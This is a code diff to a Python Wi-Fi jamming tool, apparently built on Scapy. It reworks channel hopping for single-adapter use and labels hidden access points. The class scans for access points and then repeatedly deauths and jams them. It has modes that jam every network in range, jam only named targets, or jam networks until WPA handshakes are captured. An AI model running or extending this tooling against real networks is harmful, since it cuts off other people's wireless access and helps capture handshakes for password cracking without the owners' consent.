@@ -26,10 +26,18 @@ class Jammer():
 		self.targets = targets
 		self.sleepOnChannel = sleepOnChannel
 
+		self.hiddenAPsFound = 0
 		self.handshakesFound = {}
 		self.discoveredAPs = []
-		self.channelIndex = 0
 		self.running = True
+
+		if sendInt == recvInt:
+			self.singleAdapterMode = True
+		else:
+			self.singleAdapterMode = False
+		self.channelIndex = 0
+		self.channelRequest = {sendInt : 0, recvInt : 0}
+		self.channelCurrent = {sendInt : 0, recvInt : 0}
 
 	def freqToChannel(self, freq):
 		base = 2407			# 2.4Ghz
@@ -38,31 +46,60 @@ class Jammer():
 		# 2.4 and 5Ghz channels increment by 5
 		return (freq - base)//5
 
-	def changeChannel(self, newChannel, interface):
-		call(['iwconfig', interface, 'channel', str(newChannel)], shell=False)
+	def requestChannel(self, channel, interface, block=True):
+		self.channelRequest[interface] = channel
+		if block == True:
+			while self.channelRequest[interface] != self.channelCurrent[interface] and self.running == True:
+				None
+		return True
 
-		logging.debug('Set channel to ' + str(newChannel) + ' on ' + interface)
+	def changeChannel(self, channel, interface):
+		call(['iwconfig', interface, 'channel', str(channel)], shell=False)
+		self.channelCurrent[interface] = channel
 
-	def channelHop(self):
+		logging.debug('Set channel to ' + str(channel) + ' on ' + interface)
+
+	def scrollChannelList(self):
+		# I've done it this way so that channel hopping, if I want to update it with different methods
+		#	can be done similarly to the attack switch -- for now this is the only method however
+		if self.channelIndex == len(self.searchingChannels) - 1:
+			self.channelIndex = 0
+		else:
+			self.channelIndex += 1
+		recvChannel = self.searchingChannels[self.channelIndex]
+		self.requestChannel(recvChannel, self.sendInt, block=False)
+
+	def channelControl(self):
 		while self.running == True:
-			# if the channel index is that of the last in the searchingChannels list, reset it to 0
-			if self.channelIndex == len(self.searchingChannels) - 1:
-				self.channelIndex = 0
-			# otherwise, increment by 1
-			else:
-				self.channelIndex += 1
-			# Then for self.sleepOnChannel seconds, change the change to this one every 0.25 seconds
+		# both report to centralised channel stat
+			self.scrollChannelList()
+		# singleAdapterMode -- co-ordinate hopping of channels
+		# Then for self.sleepOnChannel seconds, change the change to this one every 0.25 seconds
 			currentTime = monotonic()
+			sendChannel = self.channelRequest[self.sendInt]
 			while monotonic() < currentTime + self.sleepOnChannel and self.running == True:
-				self.changeChannel(self.searchingChannels[self.channelIndex], self.recvInt)
+				# We're expecting the recv channel to want to be updated much more
+				recvChannel = self.channelRequest[self.recvInt]
+				self.changeChannel(recvChannel, self.recvInt)
+				if self.singleAdapterMode == True:
+					sleep(0.25)
+				self.changeChannel(sendChannel, self.sendInt)
 				sleep(0.25)
 
 	def readPacket(self, packet):
 		# If the packet is a frame...
-		if packet.haslayer(Dot11):
+		if packet.haslayer(Dot11Elt):
 			# If the packet is a management frame
 			if packet.type == 0:
+				#try:
+				#	essid = bytes.decode(packet[Dot11Elt].info)
+				#except UnicodeDecodeError:
+				#	essid = '<HIDDEN_AP_' + str(self.hiddenAPsFound) + '>'
+				#	self.hiddenAPsFound += 1
 				essid = bytes.decode(packet[Dot11Elt].info)
+				if essid == '':
+					essid = '<HIDDEN_AP_' + str(self.hiddenAPsFound) + '>'
+					self.hiddenAPsFound += 1
 				bssid = packet.addr2
 				# If the packet is a beacon frame
 				if packet.subtype == 8:
@@ -75,7 +112,6 @@ class Jammer():
 							channel = self.freqToChannel(packet[RadioTap].Channel)
 							self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
 							self.ignoreBeacons.append(bssid)
-							print(self.ignoreBeacons)
 							logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
 				# Elif the packet is an authentication frame
 				elif packet.subtype == 11:
@@ -104,7 +140,7 @@ class Jammer():
 		while self.running == True:
 			for AccessPoint in self.discoveredAPs:
 				if AccessPoint.bssid not in list(self.handshakesFound.keys()):
-					self.changeChannel(AccessPoint.channel, self.sendInt)
+					self.requestChannel(AccessPoint.channel, self.sendInt)
 					AccessPoint.jam(self.sendInt)
 
 	def unarmedAttack(self):
@@ -117,13 +153,13 @@ class Jammer():
 		# Only deauth targets
 			for AccessPoint in self.discoveredAPs:
 				if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
-					self.changeChannel(AccessPoint.channel, self.sendInt)
+					self.requestChannel(AccessPoint.channel, self.sendInt)
 					AccessPoint.jam(self.sendInt)
 
 	def jammingAttack(self):
 		while self.running == True:
 			for AccessPoint in self.discoveredAPs:
-				self.changeChannel(AccessPoint.channel, self.sendInt)
+				self.requestChannel(AccessPoint.channel, self.sendInt)
 				AccessPoint.jam(self.sendInt)
 
 	def launchAttack(self):
